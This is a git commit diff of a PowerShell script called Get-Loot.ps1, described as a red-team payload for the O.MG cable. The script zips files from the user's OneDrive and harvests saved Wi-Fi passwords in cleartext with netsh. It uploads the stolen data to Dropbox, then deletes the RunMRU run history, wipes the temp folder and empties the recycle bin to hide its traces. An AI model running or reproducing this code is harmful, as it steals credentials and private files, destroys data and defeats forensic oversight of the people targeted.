d35a85ef2230a2496e35e1fbad8b8636f2860d8f
Martin Bengtsson <mab@imab.dk>
2023-10-08 14:48:16 +0200

    Update Get-Loot.ps1

--- Get-Loot.ps1
+++ Get-Loot.ps1
@@ -1,4 +1,24 @@
+<#
+.SYNOPSIS
+    This script is intended to run as a payload with the O.MG cable as a red team excercise.
+    The script can also be run manually or with other authorities           
+    
+.DESCRIPTION
+    The script currently collects files from a user's OneDrive (if OneDrive is used) and collects the user's wifi profiles.
+
+.NOTES
+    Filename: Get-Loot.ps1
+    Version: 1.0
+    Author: Martin Bengtsson
+    Blog: www.imab.dk
+    Twitter: @mwbengtsson
+
+.LINK
+    
+#> 
+#region Functions
 # Create Upload-DropBox function
+# This is created based off the Dropbox API documentation
 function Upload-DropBox() {
     [CmdletBinding()]
     param(
@@ -18,23 +38,23 @@ function Upload-DropBox() {
 }
 # Create Get-WifiProfiles function
 function Get-WifiProfiles() {
-    # Create empty array	
+    # Create empty arrays	
     $wifiProfileNames = @()
+    $wifiProfileObjects = @()
     $netshOutput = netsh.exe wlan show profiles | Select-String -Pattern " : "
     foreach ($wifiProfileName in $netshOutput){
         $wifiProfileNames += (($wifiProfileName -split ":")[1]).Trim()
     }
-    $wifiProfileObjects =@()
-    #Bind the WLAN profile names and also the password to a custom object
+    # Bind the WLAN profile names and also the password to a custom object
     foreach ($wifiProfileName in $wifiProfileNames){
-        #get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
+        # Get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
         try {
             $wifiProfilePassword = (((netsh.exe wlan show profiles name="$wifiProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
         }
         Catch {
             $wifiProfilePassword = "The password is not stored in this profile"
         }
-        #Build the object and add this to an array
+        # Build the object and add this to an array
         $wifiProfileObject = New-Object PSCustomobject 
         $wifiProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $wifiProfileName
         $wifiProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $wifiProfilePassword
@@ -42,26 +62,38 @@ function Get-WifiProfiles() {
     }
     Write-Output $wifiProfileObjects
 }
-# Variables
+#endregion
+#region Variables
 $computerName = $env:COMPUTERNAME
 $OneDriveLoot = "$env:TEMP\imabdk-loot-OneDrive-$computerName.zip"
 $wifiProfilesLoot = "$env:TEMP\imabdk-loot-WiFiProfiles-$computerName.txt"
-
-# Exfiltrate OneDrive if such is being used
-if (Test-Path $env:OneDrive) {
-    $getLoot = Get-ChildItem -Path $env:OneDrive -Recurse -Include *.docx,*.pptx,*.jpg | Select-Object -First 10
-    $getLoot | Compress-Archive -DestinationPath $OneDriveLoot -Update
+#endregion
+#region Script execution
+try {
+    # Get OneDrive loot if such exist
+    if (Test-Path $env:OneDrive) {
+        # For testing purposes I limited this to only certain filetypes as well as only selecting the first 10 objects
+        $getLoot = Get-ChildItem -Path $env:OneDrive -Recurse -Include *.docx,*.pptx,*.jpg | Select-Object -First 10
+        $getLoot | Compress-Archive -DestinationPath $OneDriveLoot -Update
+    }
+    # Get Wifi loot
+    Get-WifiProfiles | Out-File $wifiProfilesLoot
+    # Upload loot to Dropbox
+    if ((Test-Path $OneDriveLoot) -OR (Test-Path $wifiProfilesLoot)) {
+        Upload-DropBox -SourceFilePath $OneDriveLoot
+        Upload-DropBox -SourceFilePath $wifiProfilesLoot
+    }
 }
-
-Get-WifiProfiles | Out-File $wifiProfilesLoot
-
-# Upload to Dropbox
-if ((Test-Path $OneDriveLoot) -OR (Test-Path $wifiProfilesLoot)) {
-    Upload-DropBox -SourceFilePath $OneDriveLoot
-    Upload-DropBox -SourceFilePath $wifiProfilesLoot
+catch {
+    Write-Output "Script execution failed"
 }
-
-# Cleanup after script
-Remove-Item -Path "HKCU:\SOftware\Microsoft\Windows\CurrentVErsion\Explorer\RunMRU" -Force
-Remove-Item -Path "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+finally {
+    # Cleanup after script
+    # Flush history from run
+    Remove-Item -Path "HKCU:\SOftware\Microsoft\Windows\CurrentVErsion\Explorer\RunMRU" -Force -ErrorAction SilentlyContinue
+    # Clear out any temporary files
+    Remove-Item -Path "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
+    # Empty the recycle bin
+    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+}
+#endregion
